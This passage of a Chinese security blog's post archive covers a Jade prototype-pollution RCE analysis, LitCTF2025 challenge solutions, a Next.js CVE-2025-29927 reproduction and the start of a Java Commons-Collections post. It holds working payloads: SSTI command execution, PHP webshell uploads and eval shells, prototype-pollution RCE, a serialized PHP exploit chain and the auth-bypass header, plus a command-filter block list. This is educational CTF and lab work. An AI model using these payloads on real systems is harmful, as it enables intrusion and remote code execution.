= exports.compile(str, options);\n    if (options.cache) exports.cache[key] = templ;\n    return templ;\n  }\n}\n```\n\n这里的话会返回templ参数的结果，而这个参数来源于compile方法，我们跟进一下\n\n![image-20250601152406070](../image/achieve/202411/Nodejs原型链污染/image-20250601152406070.png)\n\n我们挨个打断点看看哪里出问题，先看第一个红框\n\n这里会先进入parse函数\n\n```javascript\nfunction parse(str, options){\n\n  if (options.lexer) {\n    console.warn('Using `lexer` as a local in render() is deprecated and '\n               + 'will be interpreted as an option in Jade 2.0.0');\n  }\n\n  // Parse\n  var parser = new (options.parser || Parser)(str, options.filename, options);\n  var tokens;\n  try {\n    // Parse\n    tokens = parser.parse();\n  } catch (err) {\n    parser = parser.context();\n    runtime.rethrow(err, parser.filename, parser.lexer.lineno, parser.input);\n  }\n\n  // Compile\n  var compiler = new (options.compiler || Compiler)(tokens, options);\n  var js;\n  try {\n    js = compiler.compile();\n  } catch (err) {\n    if (err.line && (err.filename || !options.filename)) {\n      runtime.rethrow(err, err.filename, err.line, parser.input);\n    } else {\n      if (err instanceof Error) {\n        err.message += '\\n\\nPlease report this entire error and stack trace to https://github.com/jadejs/jade/issues';\n      }\n      throw err;\n    }\n  }\n\n  // Debug compiler\n  if (options.debug) {\n    console.error('\\nCompiled Function:\\n\\n\\u001b[90m%s\\u001b[0m', js.replace(/^/gm, '  '));\n  }\n\n  var globals = [];\n\n  if (options.globals) {\n    globals = options.globals.slice();\n  }\n\n  globals.push('jade');\n  globals.push('jade_mixins');\n  globals.push('jade_interp');\n  globals.push('jade_debug');\n  globals.push('buf');\n\n  var body = ''\n    + 'var buf = [];\\n'\n    + 'var jade_mixins = {};\\n'\n    + 'var jade_interp;\\n'\n    + (options.self\n      ? 'var self = locals || {};\\n' + js\n      : addWith('locals || {}', '\\n' + js, globals)) + ';'\n    + 'return buf.join(\"\");';\n  return {body: body, dependencies: parser.dependencies};\n}\n```\n\n![image-20250601193142087](../image/achieve/202411/Nodejs原型链污染/image-20250601193142087.png)\n\n其实parse函数主要是执行这两步，主要是负责将模板字符串转换为可执行的 JavaScript 代码，一个是解析字符串，一个是转化成js代码\n\n最后返回的东西\n\n```javascript\n var body = ''\n    + 'var buf = [];\\n'\n    + 'var jade_mixins = {};\\n'\n    + 'var jade_interp;\\n'\n    + (options.self\n      ? 'var self = locals || {};\\n' + js\n      : addWith('locals || {}', '\\n' + js, globals)) + ';'\n    + 'return buf.join(\"\");';\n  return {body: body, dependencies: parser.dependencies};\n```\n\n`options.self` 可控, 可以绕过 `addWith` 函数, 回头跟进 compile 函数\n\n![image-20250601194027274](../image/achieve/202411/Nodejs原型链污染/image-20250601194027274.png)\n\n返回的是 buf, 跟进 visit 函数\n\n![image-20250601194148290](../image/achieve/202411/Nodejs原型链污染/image-20250601194148290.png)\n\n这里有对debug的赋值，如果debug为true就进入push，这里有拼接语句，我们看看这两个参数是否可控\n\n**node.line**和**node.filename**在 debug 为真的时候进入了 buf。然而**node.filename**被**utils.stringify**处理过了，无法逃逸双引号。唯有考虑 line 是否可以被覆盖了。\n\n```javascript\njade_debug.unshift(new jade.DebugItem( 0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('dir');//\n```\n\n最后还会执行visitNode函数\n\n```javascript\nvisitNode: function(node){\n    return this['visit' + node.type](node);}\n```\n\n然后我们type可以动态调用函数，测试结果如下\n\n| Method Name       | Status |\n| ----------------- | ------ |\n| visitAttributes   |        |\n| visitBlock        |        |\n| visitBlockComment | √      |\n| visitCase         |        |\n| visitCode         | √      |\n| visitComment      | √      |\n| visitDoctype      |        |\n| visitEach         |        |\n| visitFilter       |        |\n| visitMixin        |        |\n| visitMixinBlock   | √      |\n| visitNode         |        |\n| visitLiteral      |        |\n| visitText         |        |\n| visitTag          |        |\n| visitWhen         |        |\n\n所以最终得到链子，首先就是先覆盖debug的值使其进入push语句，然后通过构造line的值为我们的恶意代码，最后将type设置为code就可以了\n\n```\n{\"__proto__\":{\"__proto__\": {\"type\":\"Code\",\"compileDebug\":1,\"line\":\"global.process.mainModule.require('child_process').exec('calc')\"}}}\n```\n\n哦对了，还有一个self参数，需要进行设置就会跳过\n\n针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type，绕过addWith的报错\n\n## 0x03题目\n\n在ctfshowweb入门里面的nodejs就有几道js原型链污染的题目\n\n","tags":["Nodejs原型链污染"],"categories":["Nodejs原型链污染"]},{"title":"LitCTF2025wp","url":"/2025/05/29/LitCTF2025wp/","content":"\n## 星愿信箱\n\n看到有回显，并且回显是我们输入的内容，命令执行尝试无果之后结合服务器版本猜测是ssti\n\n需要有汉字包含\n\n```python\n我{%print(8*8)%}\n```\n\n回显我64\n\n直接打就行\n\n```\nPOST / HTTP/1.1\nHost: node6.anna.nssctf.cn:20413\nReferer: http://node6.anna.nssctf.cn:20413/\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nCookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1748152974\nOrigin: http://node6.anna.nssctf.cn:20413\nContent-Type: application/json\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nContent-Length: 11\n\n{\"cmd\":\"{%print((().__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('ls /')).read())%}\"}\n```\n\n回显\n\n```\napp bin boot dev docker-entrypoint.sh etc flag home lib lib64 media mnt opt proc\nroot run sbin srv sys tmp usr var\n```\n\n然后直接读flag就行了，就最后过滤了一下cat命令\n\n但是不知道为啥抓包后直接构造请求发包反而不需要汉字了\n\n## easy_file\n\n一个登录口，弱口令直接爆，不得不说yakit的功能太全面了，直接base64编码字典\n\n![image-20250529093601144](../image/achieve/202411/LitCTF2025/image-20250529093601144.png)\n\n发现弱口令admin/password，登录进去是一个文件上传，但是测了一下发现文件内容过滤了php，文件后缀名有txt和jpg白名单，然后一直卡住没思路，之后在登录界面发现了一个提示\n\n```\n//file查看头像\n```\n\n原来有一个file参数可以打文件包含，估计是这样\n\n那我们直接传个jpg恶意文件\n\n```\nPOST /admin.php HTTP/1.1\nHost: node6.anna.nssctf.cn:29182\nCache-Control: max-age=0\nCookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1748152974; PHPSESSID=dd2f3e5bdb719c7599a2e36a0f88dc2b\nReferer: http://node6.anna.nssctf.cn:29182/admin.php\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node6.anna.nssctf.cn:29182\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryzZGBw5kqGfZBSlQm\nContent-Length: 200\n\n------WebKitFormBoundaryzZGBw5kqGfZBSlQm\nContent-Disposition: form-data; name=\"avatar\"; filename=\"1.jpg\"\nContent-Type: text/plain\n\n<?=`$_POST[1]`?>\n------WebKitFormBoundaryzZGBw5kqGfZBSlQm--\n\n```\n\n然后文件包含解析php代码\n\n```\n/admin.php?file=uploads/1.jpg\n```\n\n之后传命令就行\n\n```\n1=cat%20flllag.php\n```\n\n## nest_js\n\n一开始以为是什么js的漏洞，结果发现弱口令admin/password登进去就拿到flag了，可能是我非预期了？\n\n![image-20250525122137127](../image/achieve/202411/LitCTF2025/image-20250525122137127.png)\n\n赛后复现一下，还是重新好好做一下\n\nNext.js的框架，版本是15.2.2，搜一下CVE，发现一个CVE-2025-29927 ，很简单，就是一个鉴权绕过，直接打就行\n\n```\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\n```\n\n这里是/dashboard路由不是/login路由\n\n## 多重宇宙日记\n\n提示是原型链\n\n注册后看到一个可以传JSON的口子，看一下源码\n\n```javascript\n<script>\n        // 更新表单的JS提交\n        document.getElementById('profileUpdateForm').addEventListener('submit', async function(event) {\n            event.preventDefault();\n            const statusEl = document.getElementById('updateStatus');\n            const currentSettingsEl = document.getElementById('currentSettings');\n            statusEl.textContent = '正在更新...';\n\n            const formData = new FormData(event.target);\n            const settingsPayload = {};\n            // 构建 settings 对象，只包含有值的字段\n            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');\n            if (formData.get('language')) settingsPayload.language = formData.get('language');\n            // ...可以添加其他字段\n\n            try {\n                const response = await fetch('/api/profile/update', {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/json',\n                    },\n                    body: JSON.stringify({ settings: settingsPayload }) // 包装在 \"settings\"键下\n                });\n                const result = await response.json();\n                if (response.ok) {\n                    statusEl.textContent = '成功: ' + result.message;\n                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);\n                    // 刷新页面以更新导航栏（如果isAdmin状态改变）\n                    setTimeout(() => window.location.reload(), 1000);\n                } else {\n                    statusEl.textContent = '错误: ' + result.message;\n                }\n            } catch (error) {\n                statusEl.textContent = '请求失败: ' + error.toString();\n            }\n        });\n\n        // 发送原始JSON的函数\n        async function sendRawJson() {\n            const rawJson = document.getElementById('rawJsonSettings').value;\n            const statusEl = document.getElementById('rawJsonStatus');\n            const currentSettingsEl = document.getElementById('currentSettings');\n            statusEl.textContent = '正在发送...';\n            try {\n                const parsedJson = JSON.parse(rawJson); // 确保是合法的JSON\n                const response = await fetch('/api/profile/update', {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/json',\n                    },\n                    body: JSON.stringify(parsedJson) // 直接发送用户输入的JSON\n                });\n                const result = await response.json();\n                if (response.ok) {\n                    statusEl.textContent = '成功: ' + result.message;\n                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);\n                     // 刷新页面以更新导航栏（如果isAdmin状态改变）\n                    setTimeout(() => window.location.reload(), 1000);\n                } else {\n                    statusEl.textContent = '错误: ' + result.message;\n                }\n            } catch (error) {\n                 statusEl.textContent = '请求失败或JSON无效: ' + error.toString();\n            }\n        }\n    </script>\n```\n\n看到了需要传入的格式\n\n```javas\nif (formData.get('theme')) settingsPayload.theme = formData.get('theme');\nif (formData.get('language')) settingsPayload.language = formData.get('language');\nbody: JSON.stringify({ settings: settingsPayload }) // 包装在 \"settings\"键下\n```\n\n那我们该污染什么呢？\n\n```\n刷新页面以更新导航栏（如果isAdmin状态改变）\n```\n\n估计是需要设置isAdmin为true吧，因为这里有更新设置，所以这里就是我们可以污染的地方\n\n```\nPOST /api/profile/update HTTP/1.1\nHost: node6.anna.nssctf.cn:28966\nOrigin: http://node6.anna.nssctf.cn:28966\nReferer: http://node6.anna.nssctf.cn:28966/api/profile\nAccept-Language: zh-CN,zh;q=0.9\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nCookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1748152974; PHPSESSID=dd2f3e5bdb719c7599a2e36a0f88dc2b; connect.sid=s%3Asft_5hy0wJmSER0ks3sVjQ0caWYw-LLi.x6fXJCabNklYBQlA%2BXmAsubXm%2FSwlTVwY0WCo%2BP3zHQ\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nAccept: */*\nContent-Length: 41\n\n{\"settings\":{\"theme\":\"1\",\"language\":\"1\",\"__proto__\"{\"isAdmin\":true}}}\n```\n\n然后访问管理员面板\n\n![image-20250529110030766](../image/achieve/202411/CVE复现/image-20250529110030766.png)\n\n## 君の名は\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ncreate_function(\"\", 'die(`/readflag`);');\nclass Taki\n{\n    private $musubi;\n    private $magic;\n    public function __unserialize(array $data)\n    {\n        $this->musubi = $data['musubi'];\n        $this->magic = $data['magic'];\n        return ($this->musubi)();\n    }\n    public function __call($func,$args){\n        (new $args[0]($args[1]))->{$this->magic}();\n    }\n}\n\nclass Mitsuha\n{\n    private $memory;\n    private $thread;\n    public function __invoke()\n    {\n        return $this->memory.$this->thread;\n    }\n}\n\nclass KatawareDoki\n{\n    private $soul;\n    private $kuchikamizake;\n    private $name;\n\n    public function __toString()\n    {\n        ($this->soul)->flag($this->kuchikamizake,$this->name);\n        return \"call error!no flag!\";\n    }\n}\n\n$Litctf2025 = $_POST['Litctf2025'];\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $Litctf2025)){\n    unserialize($Litctf2025);\n}else{\n    echo \"把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆\";\n}\n```\n\n链子先写一下\n\n```\nTaki::__unserialize->Mitsuha::__invoke()->KatawareDoki::__toString()->Taki::__call\n```\n\n主要看利用点\n\n```php\n(new $args[0]($args[1]))->{$this->magic}();\n```\n\n这里的话会实例化一个对象并调用对象的函数，但是类内的函数感觉没什么可以用得上的\n\n再来看下面这段代码\n\n```php\ncreate_function(\"\", 'die(`/readflag`);');\n```\n\n用create_function创建了一个匿名函数，直接执行了/readflag，所以我们现在的目的就是去调用这个匿名函数，所以我们的思路就是\n\n1. 找到可以调用匿名函数的原生类\n2. 找到匿名函数的名字\n\n先找找原生类，翻官方手册看看\n\n![image-20250529111820643](../image/achieve/202411/LitCTF2025/image-20250529111820643.png)\n\n发现ReflectionFunction::invoke可以调用函数，看一下示例\n\n```php\n<?php\nfunction title($title, $name)\n{\n    return sprintf(\"%s. %s\\r\\n\", $title, $name);\n}\n\n$function = new ReflectionFunction('title');\n\necho $function->invoke('Dr', 'Phil');\n?>\n```\n\n所以这里的话可以利用这个类去调用函数，然后我们需要解决第二个问题，就是函数名的问题\n\n```php\n<?php\n$a = create_function(\"\",'system(\"dir\");');\necho $a;\n```\n\n测试发现\n\n![image-20250529113525021](../image/achieve/202411/LitCTF2025/image-20250529113525021.png)\n\n当你调用 `create_function` 时，它会返回一个字符串，格式为 `lambda_` 后跟一个数字（例如 `lambda_1`），表示生成的匿名函数的名称。\n\n这里没把前面的字符输出，我们换个输出函数\n\n```php\n<?php\n$a = create_function(\"\",'system(\"dir\");');\nvar_dump(urlencode($a));\n//string(11) \"%00lambda_1\"\n```\n\n但是这里还有一个细节，就是在函数名前面有一个空字符\n\n![image-20250529114252006](../image/achieve/202411/LitCTF2025/image-20250529114252006.png)\n\n在weby页面打开的时候没刷新一次后面的数字就会增加1，所以需要注意这个点\n\n还需要注意一个地方就是`__call魔术方法`的传参问题\n\n```php\n__call($func,$args)\n```\n\n如果我们触发的函数是\n\n```\nflag($this->kuchikamizake,$this->name)\n```\n\n那么$func参数就是flag，$args就是$this->kuchikamizake,$this->name\n\n然后我们来看一下绕过\n\n```php\n$Litctf2025 = $_POST['Litctf2025'];\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $Litctf2025)){\n    unserialize($Litctf2025);\n}else{\n    echo \"把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆\";\n}\n```\n\n用原生类对链子进行包装，O换成C就行，之前就学过\n\n我们先写exp\n\n```php\n<?php\nclass Taki\n{\n    public $musubi;\n    public $magic;\n}\n\nclass Mitsuha\n{\n    public $memory;\n    public $thread;\n}\n\nclass KatawareDoki\n{\n    public $soul;\n    public $kuchikamizake;\n    public $name;\n\n}\n//Taki::__unserialize->Mitsuha::__invoke()->KatawareDoki::__toString()->Taki::__call\n$a = new Taki();\n$a -> musubi = new Mitsuha();\n$a -> musubi -> thread = new KatawareDoki();\n$a -> musubi -> thread -> kuchikamizake = \"ReflectionFunction\";\n$a -> musubi -> thread -> name = \"%00lambda_1\";\n$a -> musubi -> thread -> soul = new Taki();\n$a -> musubi -> thread -> soul -> magic = \"invoke\";\n$aa = new ArrayObject($a);\necho serialize($aa);\n```\n\n输出\n\n```\nC:11:\"ArrayObject\":270:{x:i:0;O:4:\"Taki\":2:{s:6:\"musubi\";O:7:\"Mitsuha\":2:{s:6:\"memory\";N;s:6:\"thread\";O:12:\"KatawareDoki\":3:{s:4:\"soul\";O:4:\"Taki\":2:{s:6:\"musubi\";N;s:5:\"magic\";s:6:\"invoke\";}s:13:\"kuchikamizake\";s:18:\"ReflectionFunction\";s:4:\"name\";s:11:\"%00lambda_1\";}}s:5:\"magic\";N;};m:a:0:{}}\n```\n\n这里进行了包装，但是在反序列化的时候会触发原生类的unserialize方法，会对内容进行反序列化，所以可以成功绕过\n\n编码后传入\n\n```\nLitctf2025=C%3a11%3a%22ArrayObject%22%3a270%3a%7bx%3ai%3a0%3bO%3a4%3a%22Taki%22%3a2%3a%7bs%3a6%3a%22musubi%22%3bO%3a7%3a%22Mitsuha%22%3a2%3a%7bs%3a6%3a%22memory%22%3bN%3bs%3a6%3a%22thread%22%3bO%3a12%3a%22KatawareDoki%22%3a3%3a%7bs%3a4%3a%22soul%22%3bO%3a4%3a%22Taki%22%3a2%3a%7bs%3a6%3a%22musubi%22%3bN%3bs%3a5%3a%22magic%22%3bs%3a6%3a%22invoke%22%3b%7ds%3a13%3a%22kuchikamizake%22%3bs%3a18%3a%22ReflectionFunction%22%3bs%3a4%3a%22name%22%3bs%3a11%3a%22%2500lambda_1%22%3b%7d%7ds%3a5%3a%22magic%22%3bN%3b%7d%3bm%3aa%3a0%3a%7b%7d%7d\n```\n\n有点奇怪没打通，但是没看出来哪里有问题emmmm\n\n看看出题人的exp\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Taki\n{\n    public $musubi;\n    public $magic = \"invoke\";\n}\n\nclass Mitsuha\n{\n    public $memory;\n    public $thread;\n}\n\nclass KatawareDoki\n{\n    public $soul;\n    public $kuchikamizake = \"ReflectionFunction\";\n    public $name = \"\\000lambda_1\";\n}\n$a = new Taki();\n$b = new Mitsuha();\n$c = new KatawareDoki();\n\n$a->musubi = $b;\t\t// 1.把对象当成函数调用，触发__invoke()\n$b->thread = $c;\t\t// 2. 把对象作为字符串使用，触发__toString()\n$c->soul = $a;\t\t\t// 3. 调用不存在的方法，触发__call()\n\n$arr=array(\"evil\"=>$a);\n$d=new ArrayObject($arr);\necho urlencode(serialize($d));\n\n```\n\n```\nLitctf2025=C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D\n```\n\n## easy_signin\n\n打开403？扫一下目录看看\n\n```\n[12:29:08] Scanning:\n[12:29:20] 301 -   169B - /api  ->  http://node6.anna.nssctf.cn/api/\n[12:29:20] 403 -   555B - /api/\n[12:29:21] 301 -   169B - /backup  ->  http://node6.anna.nssctf.cn/backup/\n[12:29:21] 403 -   555B - /backup/\n[12:29:24] 302 -     0B - /dashboard.php  ->  /login.html\n[12:29:28] 200 -    51B - /login.php\n[12:29:28] 200 -    6KB - /login.html\n```\n\n访问/login.html来到登录口，用户名是固定的，然后在源码中看到api.js，访问是`/api/sys/urlcode.php?url=`，猜测是SSRF\n\n访问一下百度发现可以出来，但是测试访问传入system的php文件发现是在本机执行的命令而不是靶机\n\n![image-20250529123802418](../image/achieve/202411/LitCTF2025/image-20250529123802418.png)\n\n在登录界面有js源码\n\n```javascript\n    <script>\n        const loginBtn = document.getElementById('loginBtn');\n        const passwordInput = document.getElementById('password');\n        const errorTip = document.getElementById('errorTip');\n        const rawUsername = document.getElementById('username').value; \n\n     \n        loginBtn.addEventListener('click', async () => {\n            const rawPassword = passwordInput.value.trim();\n            if (!rawPassword) {\n                errorTip.textContent = '请输入密码';\n                errorTip.classList.add('show');\n                passwordInput.focus();\n                return;\n            }\n\n            const md5Username = CryptoJS.MD5(rawUsername).toString();   \n            const md5Password = CryptoJS.MD5(rawPassword).toString();   \n\n     \n            const shortMd5User = md5Username.slice(0, 6);  \n            const shortMd5Pass = md5Password.slice(0, 6);  \n\n          \n            const timestamp = Date.now().toString(); //五分钟\n\n       \n            const secretKey = 'easy_signin';  \n            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();\n\n            try {\n                const response = await fetch('login.php', {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/x-www-form-urlencoded',\n                        'X-Sign': sign  \n                    },\n                    body: new URLSearchParams({\n                        username: md5Username,   \n                        password: md5Password,   \n                        timestamp: timestamp\n                    })\n                });\n\n                const result = await response.json();\n                if (result.code === 200) {\n                    alert('登录成功！');\n                    window.location.href = 'dashboard.php'; \n                } else {\n                    errorTip.textContent = result.msg;\n                    errorTip.classList.add('show');\n                    passwordInput.value = '';\n                    passwordInput.focus();\n                    setTimeout(() => errorTip.classList.remove('show'), 3000);\n                }\n            } catch (error) {\n                errorTip.textContent = '网络请求失败';\n                errorTip.classList.add('show');\n                setTimeout(() => errorTip.classList.remove('show'), 3000);\n            }\n        });\n\n        passwordInput.addEventListener('input', () => {\n            errorTip.classList.remove('show');\n        });\n    </script>\n```\n\n这里的话有一个加密签名的登录验证\n\n这里对对账号密码进行md5加密并取前六位，然后生成时间戳，结合key密钥生成签名，在请求头中携带签名\n\n之前爆破拿到弱口令admin/admin123，但是有签名验证\n\n```javascript\nconst timestamp = Date.now().toString();\n```\n\n这里生成的时间戳是毫秒级的，所以我们也需要生成毫秒级的时间戳去登录验证\n\n验证的话得写个脚本去试试\n\n```python\nimport hashlib\nimport requests\nimport time\n\nurl = \"http://node6.anna.nssctf.cn:20082/login.php\"\n#已知的账号密码和key\nsecretkey = \"easy_signin\"\nusername = \"admin\"\npassword = \"admin123\"\n\n#获取当前时间戳（毫秒级）\ntimestamp_ms = str(int(time.time() * 1000))\n\n#md5的密码\nmd5_username = hashlib.md5(username.encode()).hexdigest()\nmd5_password = hashlib.md5(password.encode()).hexdigest()\n\n#取前六位\nmd5_username6 = md5_username[:6]\nmd5_password6 = md5_password[:6]\n\nsign = hashlib.md5((md5_username6 + md5_password6 + timestamp_ms + secretkey).encode()).hexdigest()\n\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    \"X-Sign\": sign\n}\n\ndata = {\n    \"username\": md5_username,\n    \"password\": md5_password,\n    \"timestamp\": timestamp_ms\n}\nr = requests.post(url,data=data,headers=headers)\nprint(r.text)\nprint(sign)\n\n```\n\n![image-20250529125713736](../image/achieve/202411/LitCTF2025/image-20250529125713736.png)\n\n说明签名验证是对的，那我们抓包获取当前时间戳\n\n```python\nfrom datetime import datetime\nimport hashlib\n\ntimestamp_ms = \"1748495603974\"\nprint(timestamp_ms)\n\n#已知的账号密码和key\nsecretkey = \"easy_signin\"\nusername = \"admin\"\npassword = \"admin123\"\n#md5的密码\nmd5_username = hashlib.md5(username.encode()).hexdigest()\nmd5_password = hashlib.md5(password.encode()).hexdigest()\nprint(md5_username)\nprint(md5_password)\n\n#取前六位\nmd5_username6 = md5_username[:6]\nmd5_password6 = md5_password[:6]\n\nsign = hashlib.md5((md5_username6 + md5_password6 + timestamp_ms + secretkey).encode()).hexdigest()\nprint(sign)\n```\n\n挨个换一下然后放包就行\n\n![image-20250529131429554](../image/achieve/202411/LitCTF2025/image-20250529131429554.png)\n\n有一个路由，但是访问出来显示非本地用户，想起之前那个url参数，试着传一下看看\n\n```\n/api/sys/urlcode.php?url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php\n```\n\n```php\n<?php\nif ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {\nhighlight_file(__FILE__);\n\n$name=\"waf\";\n$name = $_GET['name'];\n\n\nif (preg_match('/\\b(nc|bash|sh)\\b/i', $name)) {\n    echo \"waf!!\";\n    exit;\n}\n\n\nif (preg_match('/more|less|head|sort/', $name)) {\n    echo \"waf\";\n    exit;\n}\n\n\nif (preg_match('/tail|sed|cut|awk|strings|od|ping/', $name)) {\n    echo \"waf!\";\n    exit;\n}\n\nexec($name, $output, $return_var);\necho \"执行结果：\\n\";\nprint_r($output);\necho \"\\n返回码：$return_var\";\n} else {\n    echo(\"非本地用户\");\n}\n\n?>\n```\n\nls看了一下当前目录和根目录，发现都没有flag，那我们写个马子\n\n```\n/api/sys/urlcode.php?url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=echo${IFS}\"<?php${IFS}eval(\\$_POST[1]);?>\">/var/www/html/1.php\n```\n\n连上访问327a6c4304ad5938eaf0efb6cc3e53dc.php就有flag了\n\n","tags":["LitCTF2025"],"categories":["赛题wp"]},{"title":"CVE-2025-29927Next.js中间件鉴权绕过","url":"/2025/05/29/CVE-2025-29927Next-js中间件鉴权绕过/","content":"\n## 0x01漏洞描述\n\nNext.js 是一个基于 React 的流行 Web 应用框架，提供服务器端渲染、静态网站生成和集成路由系统等功能。当使用中间件进行身份验证和授权时，Next.js 14.2.25 和 15.2.3 之前的版本存在授权绕过漏洞。\n\n![image-20250529102551187](../image/achieve/202411/CVE复现/image-20250529102551187.png)\n\n## 0x02影响版本\n\n根据官方披露推出的影响版本\n\n- **Next.js 11.1.4 ~ 13.5.6**：未修补版本\n- **Next.js 14.x**：在 14.2.25 之前均受影响\n- **Next.js 15.x**：在 15.2.3 之前均受影响\n\n也可以根据修复版本来看\n\n```\n> 对于 Next.js 15.x，此问题已在 15.2.3 中修复\n> 对于 Next.js 14.x，此问题已在 14.2.25 中修复\n> 对于 Next.js 13.x，此问题已在 13.5.9 中修复\n> 对于 Next.js 12.x，此问题已在 12.3.5 中修复\n```\n\n## 0x03环境搭建\n\n这个在vulhub靶场中有现成的https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md\n\n直接起容器就行\n\n```\ndocker compose up -d\n```\n\n不清楚访问端口的可以看一下docker-compose.yml文件\n\n![image-20250529102910325](../image/achieve/202411/CVE复现/image-20250529102910325.png)\n\n## 0x04靶场复现\n\n这个其实有两种方法\n\n一是输入默认凭据 `admin:password`，你可以登录成功并访问仪表盘。\n\n二是进行未授权访问，Next.js 在处理用户请求时，会检查 x-middleware-subrequest 以识别内部子请求，防止中间件递归调用。但在受影响版本中，对该头的来源与拼接方式**缺乏严格校验**，导致**外部恶意请求**也能带上此头，从而骗过 Next.js 判断逻辑，完全绕过中间件安全机制。\n\n在请求头中添加 `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`。或者`x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`\n\n![image-20250529103545731](../image/achieve/202411/CVE复现/image-20250529103545731.png)\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"Java反序列化CC1链","url":"/2025/05/27/Java反序列化CC1链/","content":"\n环境搭建参考文章：\n\nhttps://blog.csdn.net/weixin_49047967/article/details/134763883\n\nhttps://www.cnblogs.com/1vxyz/p/17284838.html\n\nhttps://www.freebuf.com/articles/web/383152.html\n\n## 0x01漏洞描述\n\nCC1全称Commons-Collections1，是利用了Apache Commons项目中Commons-Collections库的一个反序列化漏洞，所以commons-collections组件反序列化漏洞的反射链也称为CC链\n\nApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。\n\n## 0x02影响版本&环境搭建\n\n**jdk < 8u71**\n\n**CommonsCollections <= 3.2.1**\n\n因为CC1链在jdk 8u71后就修复了 ，在高版本这条链子最后的annotationInvocationHandler类readObject之后，memberValues小版本有值，高版本是空\n\n因此我们复现就利用 8u65的版本\n\nhttps://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html\n\n![image-20250527185106302](../image/achieve/202411/java学习/image-20250527185106302.png)\n\n下载安装后配置环境变量，之后查看一下版本就行\n\n![image-20250527191355478](../image/achieve/202411/java学习/image-20250527191355478.png)\n\n然后去 下载[openjdk](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)，下载后解压，再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩包，我们解压这个src到src文件夹，之后把之前源码包(idk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷贝到src文件夹中去。\n\n![image-20250527191955632](../image/achieve/202411/java学习/image-20250527191955632.png)\n\n![image-20250527192040996](../image/achieve/202411/java学习/image-20250527192040996.png)\n\n然后进入IDEA，在设置中找到项目结构\n\n![image-20250527192316515](../image/achieve/202411/java学习/image-20250527192316515.png)\n\n然后我们新建一个Maven（照着选就行）\n\n![image-20250527192555517](../image/achieve/202411/java学习/image-20250527192555517.png)\n\n然后导入commons collections maven依赖\n\n```xml\n  <dependency>\n    <groupId>commons-collections</groupId>\n    <artifactId>commons-collections</artifactId>\n    <version>3.2.1</version>\n  </dependency>\n```\n\n在pom.xml添加依赖，完整代码是这样的\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n  